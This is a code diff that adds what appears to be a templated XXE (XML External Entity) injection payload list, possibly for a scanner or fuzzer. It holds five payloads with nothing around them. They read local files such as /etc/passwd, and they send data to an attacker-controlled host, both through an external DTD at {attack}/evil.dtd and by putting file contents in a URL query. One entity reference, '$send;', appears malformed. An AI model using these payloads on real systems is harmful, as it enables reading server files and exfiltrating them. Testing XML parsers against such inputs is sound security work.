@@ -1,0 +1,32 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file://{file}">
+]>
+<root>&xxe;</root>
+---
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "http://{attack}/evil.dtd">
+%file;
+]>
+<data>$send;</data>
+---
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo><data>&xxe;</data></foo>
+---
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file://{file}">
+]>
+<foo>&xxe;</foo>
+---
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://{attack}/?file={file}">
+]>
+<foo>&xxe;</foo>
